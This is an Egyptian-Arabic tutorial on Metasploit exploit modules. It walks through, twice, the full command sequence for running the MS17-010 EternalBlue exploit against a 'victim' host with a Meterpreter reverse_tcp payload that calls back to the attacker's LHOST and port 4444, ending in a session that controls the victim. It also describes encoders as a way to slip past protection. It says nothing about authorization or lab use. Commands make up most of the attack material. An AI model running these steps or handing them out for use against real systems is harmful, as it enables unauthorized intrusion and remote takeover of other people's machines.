
# **📌 يعني إيه وحدات الاستغلال (Exploit Modules)؟**

في **Metasploit**، عندك حاجة اسمها **وحدات الاستغلال**، ودي عبارة عن **أدوات جاهزة بتساعدك في استغلال الثغرات** بدل ما تكتب كود من الصفر.

💡 يعني لو عندك ثغرة معروفة، مش لازم تبرمج استغلال ليها بنفسك، ممكن تدور في Metasploit وتشوف إذا كان فيه وحدة استغلال جاهزة ليها، وتستخدمها على طول! 🔥

---

# **🎯 أنواع وحدات الاستغلال في Metasploit**

في Metasploit، فيه **4 أنواع رئيسية من وحدات الاستغلال**:

1️⃣ **Exploit Modules** – وحدات الاستغلال الجاهزة اللي بتنفذ الهجوم على الثغرة.  
2️⃣ **Payloads** – أكواد بتنزل على الجهاز المستهدف عشان تفتح اتصال عكسي أو تتحكم فيه.  
3️⃣ **Encoders** – بتساعد في إخفاء الاستغلال عشان يتخطى الحماية.  
4️⃣ **Auxiliary Modules** – أدوات إضافية زي الفحص والمسح وجمع المعلومات.

---

# **🚀 خطوات استخدام وحدات الاستغلال في Metasploit**

### **🟢 1. تشغيل Metasploit Console**

📌 شغل الـ **MSFConsole** باستخدام الأمر:

```bash
msfconsole
```

---

### **🟢 2. البحث عن وحدة استغلال (Exploit Module)**

📌 لو عايز تدور على استغلال لثغرة معينة، استخدم:

```bash
search smb
```

🔹 ده هيجيب لك كل الثغرات المرتبطة بـ SMB، زي **MS17-010 (EternalBlue)**.

---

### **🟢 3. اختيار وحدة الاستغلال المناسبة**

📌 لو لقيت الاستغلال اللي عايزه، استخدمه كده:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

🔹 كده انت اخترت وحدة الاستغلال اللي هتستخدمها.

---

### **🟢 4. ضبط الإعدادات (Set Options)**

📌 بعد اختيار الاستغلال، لازم تضبط الإعدادات زي IP الضحية وIP جهازك:

```bash
set RHOSTS 192.168.1.1   # جهاز الضحية
set LHOST 192.168.1.2    # جهازك اللي هيتلقى الاتصال العكسي
set LPORT 4444           # البورت اللي هيشتغل عليه الاتصال
```

---

### **🟢 5. اختيار الـ Payload المناسب**

📌 الـ **Payload** هو الكود اللي هيتنفذ بعد نجاح الاستغلال، وده مثال على اختيار Meterpreter:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

---

### **🟢 6. تنفيذ الاستغلال! 🚀**

📌 بمجرد ضبط كل الإعدادات، شغل الاستغلال بالأمر ده:

```bash
exploit
```

🔹 **لو كل حاجة تمام، هيتم تنفيذ الثغرة، وهيجيلك Session تتحكم من خلالها في الضحية باستخدام Meterpreter!** 🔥

---

# **💡 الخلاصة بالمصري:**

1️⃣ **وحدات الاستغلال (Exploit Modules) في Metasploit بتسهّل عليك تنفيذ الثغرات الجاهزة.**  
2️⃣ **ممكن تدور على ثغرة معينة باستخدام أمر `search` في Metasploit.**  
3️⃣ **بعد اختيار الثغرة، بتضبط إعدادات الهدف (`set RHOSTS` و `set LHOST`).**  
4️⃣ **بتختار الـ Payload المناسب عشان تفتح اتصال عكسي وتتحكم في الضحية.**  
5️⃣ **بتنفذ الاستغلال باستخدام أمر `exploit`، ولو نجح هتدخل على النظام المستهدف!**

---

## **🛠️ الخطوات العملية لاستخدام وحدات الاستغلال**

✅ **1. تشغيل Metasploit:**

```bash
msfconsole
```

✅ **2. البحث عن استغلال معين:**

```bash
search smb
```

✅ **3. اختيار استغلال معين:**

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

✅ **4. ضبط إعدادات الهدف:**

```bash
set RHOSTS 192.168.1.1
set LHOST 192.168.1.2
set LPORT 4444
```

✅ **5. اختيار الـ Payload:**

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

✅ **6. تنفيذ الاستغلال:**

```bash
exploit
```

🎯 **لو الاستغلال نجح، هتدخل على الضحية، وتقدر تكمل مرحلة ما بعد الاختراق!** 🔥